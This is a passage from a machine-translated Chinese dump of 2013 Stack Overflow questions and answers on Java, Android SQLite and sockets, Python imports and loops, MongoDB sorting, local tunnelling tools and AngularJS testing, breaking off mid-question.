1.  Polyfill 画布，例如[http://flashcanvas.net/](http://flashcanvas.net/)（或[其他](https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-browser-Polyfills#canvas)），不确定这些是否支持读取像素信息
2.  [使用用 JS 编写或使用Emscripten](https://github.com/kripken/emscripten)编译的 JPEG（假设是格式）解码器（例如 libjpeg）

# 3d - 整数线性规划 3D 约束

> ID：15750942
> 
> 赞同：0
> 
> 时间：2013-04-01T20:07:14.953
> 
> 标签：3d, integer, linear-programming

我只完成了基本的 2D ILP，但我想知道如何将其应用于 3D 体积立方体堆叠程序。我对如何设置问题感到困惑。是否有任何公开可用的资源来帮助我。谢谢。

# ruby-on-rails - 从其他计算机访问虚拟主机 – xip.io 替代方案

> ID：15750947
> 
> 赞同：3
> 
> 时间：2013-04-01T20:07:48.857
> 
> 标签：ruby-on-rails, virtualhost, saucelabs, rack-pow, xip.io

> 有时您需要从本地网络上的另一台计算机访问您的 (Pow) 虚拟主机——例如，在移动设备上或从 Windows 或 Linux VM 测试您的应用程序时。

到目前为止，我一直在使用[`pow`](http://pow.cx/ "Pow：Mac OS X 的零配置机架服务器")xip.io似乎是[从](http://xip.io/ "xip.io：所有人的通配符 DNS")[其他计算机访问虚拟主机的](http://pow.cx/manual.html#section_2.1.5 "Pow：从其他计算机访问虚拟主机")*事实上*的方式。

今天我需要在 Internet Explorer 上测试一个修补程序，在 Windows 机器上，使用[saucelabs.com](https://saucelabs.com "Sauce Labs：云化移动和浏览器测试")，在这种情况下 xip.io 不再工作。

Pow 用户手册建议`showoff-io`作为一种替代方法——<em>通过网络共享 localhost 的最简单方法——但似乎这个已经商业化，改名为[forwardhq.com](https://forwardhq.com/ "通过 Web 共享 localhost — 转发")。

有没有可以与 Sauce Labs 等测试平台一起使用的 xip.io 的免费替代品？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-02-12T00:58:43.470

[**ngrok.com**](https://ngrok.com/)也是一个不错的选择。Simple Go 二进制文件，它代理 HTTP 和 HTTPS。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-09-02T11:30:26.843

我已经在 Sauce Labs 上成功使用了[proxylocal ，它在](http://proxylocal.com/)[Github](https://github.com/proxylocal/proxylocal-gem)上是免费的。

不幸的是，我发现 ForwardHQ 经常断开连接，但 proxylocal 到目前为止一直很稳定。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-12-24T22:15:49.747

试试[Burrow.io](https://burrow.io)。免费计划允许您创建一个 HTTP 隧道，而您无需安装任何东西。通过 Web 界面创建隧道后，您只需在终端上粘贴一个 CURL 命令即可神奇地连接起来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-30T15:32:18.033

还有一个类似于 proxylocal 的工具 - localtunnel [（](http://localtunnel.me/)它是 github 链接 - [https://github.com/defunctzombie/localtunnel](https://github.com/defunctzombie/localtunnel)）

# java - 变量 hitOrStick 可能尚未初始化

> ID：15750948
> 
> 赞同：0
> 
> 时间：2013-04-01T20:07:51.177
> 
> 标签：java, variables

我对这个代码有问题，它用于学校任务，编译时说

```
hitOrStick might not have been initialized 
```

我不知道是什么原因造成的，因为我很确定它已被初始化，如果您能发现任何其他错误，将不胜感激。

（我知道这不是真正的黑杰克，它非常基本！）再次感谢。

```
import java.util.Scanner;
import java.util.Random;
import java.lang.*; 

class blackjack

{
    public static void main(String[] args)
    {

Scanner scan = new Scanner(System.in);

int total;
boolean play;
int computerTotal = 0;
String hitOrStick;

System.out.println("You are playing BLACK JACK.");

    int card1 = (int) Math.ceil(Math.random() * 10);
    int card2 = (int) Math.ceil(Math.random() * 10);
    total = card1+card2;

    System.out.println("Card 1 value: "+ card1);
    System.out.println(" ");
    System.out.println("Card 2 value: "+ card2);
    System.out.println(" ");
    System.out.println("You have: " + total);
    System.out.println(" ");

    if(total == 21)
        {
        System.out.println("Blackjack! Congratulations you have won!");
        }
    while(total < 21)
        {
        System.out.println("Would you like to hit or stick? please type 'H' or 'S'");
        System.out.println(" ");
        System.out.println("If you type anything other than the options it will count as a STICK.");
        hitOrStick = scan.next();
        }   
        if(hitOrStick == "H")
            {
            int hitCard = (int) Math.ceil(Math.random() * 10);
            System.out.println("New Card value: "+ hitCard);
            total = total + hitCard;
            System.out.println(" ");
            System.out.println("You now have: " + total);
                if(total > 21)
                {
                System.out.println("YOU ARE BUST!");
                }
            }
            else
            {
            System.out.println(" ");
            System.out.println("You have chosen to stick.");
            System.out.println(" ");
            System.out.println("Your total is: " + total);
            computerTotal = (int) Math.ceil(Math.random() * 20);
            System.out.println(" ");
            System.out.println("the computer has: " + computerTotal);
            }

            if (computerTotal > total)
            {
            System.out.println(" ");
            System.out.println("COMPUTER WINS!");
            }
            else
            {
            System.out.println(" ");
            System.out.println("YOU WIN!");
            }

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:09:52.440

只需声明一个初始值：

```
String hitOrStick = ""; // or null 
```

编译器不会解释您的代码以确保在使用变量时将其设置为一个值，它只是指出它可能是可能的。

事实上，如果您使用的是 Eclipse，您可以设置您的首选项，以便此编译器错误只是一个警告或被忽略的条件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:11:21.013

编译器抱怨您的字符串 var 没有初始值。将显式 null 放入您的 var。例如 `String hitOrStick=null;`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T20:18:11.697

在您的代码中：

```
int total;
boolean play;
int computerTotal = 0;
String hitOrStick; 
```

几个变量已命名，但未初始化。它有助于将它们全部初始化：

```
int total = 0;
boolean play = false;
int computerTotal = 0;
String hitOrStick = ""; 
```

通过这样做，您可以确保发生更少的错误。

* * *

您的错误发生是因为 hitOrStick 已命名，未初始化，然后在代码的后面，您有`if (hitOrStick == "H")`（这不是一个好主意，更好的是`if (hitOrStick.equals("H"))`）可能会在 hitOrStick 仍未初始化时调用。

# java - 应用程序在首次启动 android 时崩溃

> ID：15750949
> 
> 赞同：0
> 
> 时间：2013-04-01T20:07:57.753
> 
> 标签：java, android, crash, sqliteopenhelper

我有一个应用程序从 sqlite 数据库浏览器读取数据库，然后复制数据库并继续。但是，每次我在 sqlite 数据库浏览器中更改数据库时，我都必须卸载并重新安装应用程序才能再次复制它。（这只是为了大学作业）在第一次启动时它总是崩溃，但在第二次启动时就可以了。有没有办法避免这种崩溃？

这是我的一些代码：

```
 public DbH(Context context) throws IOException {
    super(context, DB_NAME, null, 1);
    this.mycontext = context;
}

public void createdatabase() throws IOException {
    boolean dbexist = checkdatabase();
    if (dbexist) {
        System.out.println(" Database exists.");
    } else {
        this.getReadableDatabase();
        try {
            copydatabase();
        } catch (IOException e) {
            throw new Error("Error copying database");
        }
    }
}

private boolean checkdatabase() {
    // SQLiteDatabase checkdb = null;
    boolean checkdb = false;
    try {
        String myPath = DB_PATH + DB_NAME;
        File dbfile = new File(myPath);
        checkdb = SQLiteDatabase.openDatabase(myPath, null,
                SQLiteDatabase.OPEN_READWRITE) != null;
        checkdb = dbfile.exists();
    } catch (SQLiteException e) {
        System.out.println("Database doesn't exist");
    }

    return checkdb;
}

private void copydatabase() throws IOException {

    InputStream myinput = mycontext.getAssets().open(DB_NAME);
    String outfilename = DB_PATH + DB_NAME;
    OutputStream myoutput = new FileOutputStream(outfilename);

    byte[] buffer = new byte[1024];
    int length;
    while ((length = myinput.read(buffer)) > 0) {
        myoutput.write(buffer, 0, length);
    }

    myoutput.flush();
    myoutput.close();
    myinput.close();

}

public void opendatabase() throws SQLException {
    // Open the database
    String mypath = DB_PATH + DB_NAME;
    myDataBase = SQLiteDatabase.openDatabase(mypath, null,
            SQLiteDatabase.OPEN_READONLY);

}

public synchronized void close() {
    if (myDataBase != null) {
        myDataBase.close();
    }
    super.close();

} 
```

以下是 Logcat 中的错误

```
 04-01 22:24:55.909: E/SqliteDatabaseCpp(25335): DB info: sqlite3_open_v2("/data/data/com.example.databasebrowser/databases , key = T", &handle, 2,     NULL) failed
    04-01 22:24:55.909: E/SqliteDatabaseCpp(25335): DB info: errno = 2, errno message = No such file or directory
    04-01 22:24:55.949: E/SQLiteDatabase(25335): Failed to open the database. closing it.
    04-01 22:24:55.949: E/SQLiteDatabase(25335): android.database.sqlite.SQLiteCantOpenDatabaseException: unable to open database file
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.dbopen(Native Method)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1093)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1050)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1026)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.example.databasebrowser.DbH.checkdatabase(DbH.java:60)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.example.databasebrowser.DbH.createdatabase(DbH.java:41)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.example.databasebrowser.MyActivity.validateLogin(MyActivity.java:99)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.example.databasebrowser.MyActivity.onClick(MyActivity.java:66)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.view.View.performClick(View.java:3538)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.view.View$PerformClick.run(View.java:14330)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.os.Handler.handleCallback(Handler.java:608)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.os.Handler.dispatchMessage(Handler.java:92)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.os.Looper.loop(Looper.java:156)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at android.app.ActivityThread.main(ActivityThread.java:4977)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at java.lang.reflect.Method.invokeNative(Native Method)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at java.lang.reflect.Method.invoke(Method.java:511)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
    04-01 22:24:55.949: E/SQLiteDatabase(25335):    at dalvik.system.NativeStart.main(Native Method)
    04-01 22:24:56.450: E/SqliteDatabaseCpp(25335): SELECT locale FROM android_metadata failed
    04-01 22:24:56.470: E/SQLiteDatabase(25335): Failed to open the database. closing it.
    04-01 22:24:56.470: E/SQLiteDatabase(25335): android.database.sqlite.SQLiteException: no such table: android_metadata
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.native_setLocale(Native Method)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.setLocale(SQLiteDatabase.java:2186)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1094)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1050)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1026)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at com.example.databasebrowser.DbH.opendatabase(DbH.java:98)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at com.example.databasebrowser.MyActivity.validateLogin(MyActivity.java:105)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at com.example.databasebrowser.MyActivity.onClick(MyActivity.java:66)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.view.View.performClick(View.java:3538)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.view.View$PerformClick.run(View.java:14330)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.os.Handler.handleCallback(Handler.java:608)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.os.Handler.dispatchMessage(Handler.java:92)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.os.Looper.loop(Looper.java:156)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at android.app.ActivityThread.main(ActivityThread.java:4977)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at java.lang.reflect.Method.invokeNative(Native Method)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at java.lang.reflect.Method.invoke(Method.java:511)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
    04-01 22:24:56.470: E/SQLiteDatabase(25335):    at dalvik.system.NativeStart.main(Native Method)
    04-01 22:24:56.480: E/AndroidRuntime(25335): FATAL EXCEPTION: main
    04-01 22:24:56.480: E/AndroidRuntime(25335): android.database.sqlite.SQLiteException: no such table: android_metadata
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.database.sqlite.SQLiteDatabase.native_setLocale(Native Method)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.database.sqlite.SQLiteDatabase.setLocale(SQLiteDatabase.java:2186)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1094)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1050)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1026)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at com.example.databasebrowser.DbH.opendatabase(DbH.java:98)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at com.example.databasebrowser.MyActivity.validateLogin(MyActivity.java:105)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at com.example.databasebrowser.MyActivity.onClick(MyActivity.java:66)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.view.View.performClick(View.java:3538)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.view.View$PerformClick.run(View.java:14330)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.os.Handler.handleCallback(Handler.java:608)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.os.Handler.dispatchMessage(Handler.java:92)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.os.Looper.loop(Looper.java:156)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at android.app.ActivityThread.main(ActivityThread.java:4977)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at java.lang.reflect.Method.invokeNative(Native Method)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at java.lang.reflect.Method.invoke(Method.java:511)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
    04-01 22:24:56.480: E/AndroidRuntime(25335):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:23:21.317

You should subclass [SQLiteOpenHelper](http://developer.android.com/reference/android/database/sqlite/SQLiteOpenHelper.html) to avoid DB creation errors. This handles all db creation, update and checking for existence issues - without doing it yourself. Also, it will create the DB file in the default recommended path.

The following can be a DB open helper class you can use in your code.

```
class myDbHelper extends SQLiteOpenHelper {
    public myDbHelper(Context context, String name, CursorFactory factory,
            int version) {
        super(context, name, factory, version);
    }

    // Called when no database exists on disk 
    @Override
    public void onCreate(SQLiteDatabase _db) {
        _db.execSQL(DATABASE_CREATE);
    }

    // Called when there is a database version mismatch meaning that
    // the version of the database on disk needs to be upgraded to
    // the current version.
    @Override
    public void onUpgrade(SQLiteDatabase _db, int _oldVersion,
            int _newVersion) {
        // Upgrade the existing database to conform to the new version.
        _db.execSQL("DROP TABLE IF EXISTS " + DATABASE_TABLE);
        // Create a new one.
        onCreate(_db);
    }
} 
```

Lars Vogel has a [nice tutorial](http://www.vogella.com/articles/AndroidSQLite/article.html#databasetutorial_database) on this.

# android - android和PC之间的Tcp/Ip连接代码，但无法在它们之间建立连接，那么我如何连接它们？

> ID：15750951
> 
> 赞同：0
> 
> 时间：2013-04-01T20:08:11.863
> 
> 标签：android, tcpclient, android-wifi

这是 android 手机和 PC 之间 tcp 连接的代码，但是我无法连接，也无法从 android 向 pc 发送字符串......任何建议

客户端编程

```
package com.exercise.AndroidClient;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class AndroidClient extends Activity {

EditText textOut;
TextView textIn;

 /** Called when the activity is first created. */
 @Override
 public void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
     setContentView(R.layout.main);

     textOut = (EditText)findViewById(R.id.textout);
     Button buttonSend = (Button)findViewById(R.id.send);
     textIn = (TextView)findViewById(R.id.textin);
     buttonSend.setOnClickListener(buttonSendOnClickListener);
 }

 Button.OnClickListener buttonSendOnClickListener
 = new Button.OnClickListener(){

@Override
public void onClick(View arg0) {
 // TODO Auto-generated method stub
 Socket socket = null;
 DataOutputStream dataOutputStream = null;
 DataInputStream dataInputStream = null;

 try {
  socket = new Socket("192.168.1.101", 8888);
  dataOutputStream = new DataOutputStream(socket.getOutputStream());
  dataInputStream = new DataInputStream(socket.getInputStream());
  dataOutputStream.writeUTF(textOut.getText().toString());
  textIn.setText(dataInputStream.readUTF());
 } catch (UnknownHostException e) {
  // TODO Auto-generated catch block
  e.printStackTrace();
 } catch (IOException e) {
  // TODO Auto-generated catch block
  e.printStackTrace();
 }
 finally{
  if (socket != null){
   try {
    socket.close();
   } catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
   }
  }

  if (dataOutputStream != null){
   try {
    dataOutputStream.close();
   } catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
   }
  }

  if (dataInputStream != null){
   try {
    dataInputStream.close();
   } catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
   }
  }
 }
}};
} 
```

服务器端编程

```
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class MyServer {

 public static void main(String[] args){
  ServerSocket serverSocket = null;
  Socket socket = null;
  DataInputStream dataInputStream = null;
  DataOutputStream dataOutputStream = null;

  try {
   serverSocket = new ServerSocket(8888);
   System.out.println("Listening :8888");
  } catch (IOException e) {
   // TODO Auto-generated catch block
   e.printStackTrace();
  }

  while(true){
   try {
    socket = serverSocket.accept();
    dataInputStream = new DataInputStream(socket.getInputStream());
    dataOutputStream = new DataOutputStream(socket.getOutputStream());
    System.out.println("ip: " + socket.getInetAddress());
    System.out.println("message: " + dataInputStream.readUTF());
    dataOutputStream.writeUTF("Hello!");
   } catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
   }
   finally{
    if( socket!= null){
     try {
      socket.close();
     } catch (IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
     }
    }

    if( dataInputStream!= null){
     try {
      dataInputStream.close();
     } catch (IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
     }
    }

    if( dataOutputStream!= null){
     try {
      dataOutputStream.close();
     } catch (IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
     }
    }
   }
  }
 }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-13T08:39:36.957

首先，您需要检查 AndroidManifest.xml 中的权限（并查看 int Cat 日志，表明您的 android 抛出的异常类似于 Posible permission denied, INTERNET ...）。以下是 AndroidManifest.xml 的权限：

```
<uses-permission android:name="android.permission.INTERNET" >
</uses-permission>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
</uses-permission> 
```

有关详细信息，请参阅[javacodegeeks 上的示例](http://examples.javacodegeeks.com/android/core/socket-core/android-socket-example/)。

# java - 使用mongodb java驱动，在使用$nearsphere的时候，可以按距离以外的方式进行排序吗？

> ID：15750952
> 
> 赞同：0
> 
> 时间：2013-04-01T20:08:20.013
> 
> 标签：java, mongodb

我正在使用 $nearsphere 查询，然后对光标应用按日期排序，但 mongo 似乎忽略了按日期排序。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:19:34.320

您可以使用 Java 对结果进行排序，也可以使用聚合框架。

要使用聚合进行查询，您必须使用[Collection.aggregate](http://api.mongodb.org/java/current/com/mongodb/DBCollection.html#aggregate%28com.mongodb.DBObject,%20com.mongodb.DBObject...%29)方法。此方法需要两个 DBObject 作为参数：

1.  您的搜索查询
2.  您的聚合命令应该如下所示：`{ $sort: { date: 1 } }`

Collection.aggregate 的返回值是一个[AggregationOutput](http://api.mongodb.org/java/current/com/mongodb/AggregationOutput.html)对象，它实现了 Iterable，因此可以在 for 循环中进行迭代。

更多信息可以在这里找到：http: [//docs.mongodb.org/ecosystem/tutorial/use-aggregation-framework-with-java-driver/](http://docs.mongodb.org/ecosystem/tutorial/use-aggregation-framework-with-java-driver/)

# python - Python - 当包具有相同名称时从文件导入

> ID：15750955
> 
> 赞同：2
> 
> 时间：2013-04-01T20:08:35.200
> 
> 标签：python, import

当我开始我的 python 项目时，我做了一些愚蠢的事情：我将我的主文件命名为 project.py，并将一堆逻辑存储在一个也称为 project 的包中。这是目录结构：

```
project.py
project/
    other files 
```

问题来了：现在我需要从 project.py 中导入 main 函数。但是每次我尝试导入它时，python都会尝试导入包而不是模块。

```
>>> from project import main
AttributeError: 'module' object has no attribute 'main'
>>> import project
>>> print(project)
>>> <module 'project' from 'c:\temp\project\__init__.pyc'> 
```

有没有办法在不重命名文件夹或文件的情况下解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:47:42.737

现在，我的解决方案是将逻辑从 project.py 移动到一个新文件：

```
project.py
project/
    main.py 
```

project.py 的内容：

```
import project.main
if __name__ == "__main__":
    project.main.main() 
```

然后我可以直接导入 project.main.main() 。

# python - 对我的程序有一点帮助

> ID：15750956
> 
> 赞同：0
> 
> 时间：2013-04-01T20:08:43.563
> 
> 标签：python

我需要一些关于这个程序的帮助。我已经尝试了一些东西，但它似乎不起作用。当我单击运行时，没有任何反应。我认为我的循环可能有问题，但我不太确定。另外我不知道如何添加通货膨胀。**感谢任何帮助！**

**附加信息：** 您的父母需要购买一辆新车，他们正试图决定是否购买混合动力车。与非混合动力汽车相比，混合动力汽车产生的二氧化碳排放量更少，燃油效率更高。然而，混合动力汽车也比非混合动力汽车花费更多的钱。帮助您的父母决定购买哪种类型的车辆（严格按照财务成本而不考虑环境效益）。典型的家庭每年行驶 20,000 公里，目前汽油价格为 1.30 美元/升。

**问题：** 允许用户输入混合动力和非混合动力车辆的成本以及这些车辆的综合燃油效率。此外，允许用户输入
他们每年驾驶的平均公里数（注意：平均为 20000 公里/年）。然后
输出两辆车的成本相等需要多少年的所有权。
假设汽油价格保持在 1.30 美元/升不变。

显然，gas 的成本会逐年增加（这称为通货膨胀）。
将天然气价格每年上涨 3%
（即年通货膨胀率为 3%）的想法纳入您的计算中。

**这是我到目前为止所拥有的：**

```
i=0 # The year counter
gas=1.30
avgkm=20000
inflation=1.03
standard_cost=0
hybrid_cost=0

standard_cost=input("Enter the price of the non-hybrid car: ")
hybrid_cost=input("Enter the price of the hybrid car: ")
fueleff1=input("Enter litres/100km for the standard car: ")
fueleff2=input("Enter litres/100km for the hybrid car: ")

standardyear=avgkm/100 * fueleff1 * gas + standard_cost
hybridyear=avgkm/100 * fueleff2 * gas + hybrid_cost

while standard_cost != hybrid_cost:
    i += 1    # Add a year
    standard_cost += standardyear    
    hybrid_cost += hybridyear
    if hybrid_cost==standard_cost:
        break

print "It will take",i,"years. " 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:22:33.067

我看到几个问题：

1) 只有在 standard_cost 完全等于 hybrid_cost 时，您的循环才会退出，您可能想在 hybrid_cost <= standard_cost 时尝试跳出循环

2）线条

```
if hybrid_cost==standard_cost:
    break 
```

在你的while循环中与while中的条件语句是多余的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:20:53.357

只有完全`standard_cost`等于时，您的循环才会停止`hybrid_cost`。你应该停止循环 if `hybrid_cost <= standard_cost`。

# android-intent - Android Intent NullPointer 异常

> ID：15750964
> 
> 赞同：0
> 
> 时间：2013-04-01T20:09:09.957
> 
> 标签：android-intent, nullpointerexception, android-activity, android-manifest

我正在尝试调用不同的活动，具体取决于输入的密码是否正确。但我总是收到一个 NullPointerException 强制关闭我的应用程序。

**我的代码：**

```
 Intent MainScreenIntent = new Intent("com.shr.khg.Login");
 startActivity(MainScreenIntent); 
```

**我的清单：**

```
<activity
            android:name="com.shr.khg.LoginActivity"
            android:label="@string/title_activity_login" >
             <intent-filter>
                <action android:name="com.shr.khg.Login" />

                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity> 
```

**日志：**

```
04-01 20:05:59.221: D/dalvikvm(1846): GC_FOR_ALLOC freed 34K, 4% free 8624K/8963K, paused 57ms
04-01 20:05:59.230: I/dalvikvm-heap(1846): Grow heap (frag case) to 9.514MB for 1024016-byte allocation
04-01 20:05:59.320: D/dalvikvm(1846): GC_FOR_ALLOC freed <1K, 4% free 9624K/9991K, paused 58ms
04-01 20:05:59.460: D/dalvikvm(1846): GC_CONCURRENT freed <1K, 4% free 9624K/9991K, paused 5ms+14ms
04-01 20:06:05.860: D/AndroidRuntime(1846): Shutting down VM
04-01 20:06:05.860: W/dalvikvm(1846): threadid=1: thread exiting with uncaught exception (group=0x40014760)
04-01 20:06:05.870: E/AndroidRuntime(1846): FATAL EXCEPTION: main
04-01 20:06:05.870: E/AndroidRuntime(1846): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.shr.khg/com.shr.khg.LoginActivity}: java.lang.NullPointerException
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1815)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1831)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread.access$500(ActivityThread.java:122)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1024)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.os.Looper.loop(Looper.java:132)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread.main(ActivityThread.java:4123)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at java.lang.reflect.Method.invokeNative(Native Method)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at java.lang.reflect.Method.invoke(Method.java:491)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:841)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:599)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at dalvik.system.NativeStart.main(Native Method)
04-01 20:06:05.870: E/AndroidRuntime(1846): Caused by: java.lang.NullPointerException
04-01 20:06:05.870: E/AndroidRuntime(1846):     at com.shr.khg.LoginActivity.setup(LoginActivity.java:98)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at com.shr.khg.LoginActivity.onCreate(LoginActivity.java:89)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.Activity.performCreate(Activity.java:4397)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1048)
04-01 20:06:05.870: E/AndroidRuntime(1846):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1779)
04-01 20:06:05.870: E/AndroidRuntime(1846):     ... 11 more 
```

我做错了什么？我只是不明白，因为它看起来适用于我的所有其他活动，但不适用于那个。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T10:48:09.980

创建意图以启动新活动的语法`ActivityB`是`ActivityA`：

```
Intent intent = new Intent(ActivityA.this, ActivityB.class);
startActivity(intent); 
```

你的语法错误。日志显示 NullPointerException 在您的`LoginActivity`. 请从这两行发布代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-19T02:35:24.113

您正在进行的活动的 onCreate 有问题。问题是您的应用程序在需要对象的情况下尝试使用 null。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T13:15:57.397

我现在找到了答案，我不小心将错误的布局分配给了活动，因此它无法设置处理程序。

# angularjs - 使用 Angular UI 日期选择器进行 E2E 测试

> ID：15750966
> 
> 赞同：2
> 
> 时间：2013-04-01T20:09:14.757
> 
> 标签：angularjs, integration-testing, jquery-ui-datepicker, angular-ui

第一篇文章。我有一种情况，我使用 jQuery UI 的 datepicker 来设置模型属性。这是使用 Angular UI 完成的，并且似乎运行良好，但我很难在 E2E 场景中对其进行测试。

这是html：

```
<form ng-submit="submitForm(request)">
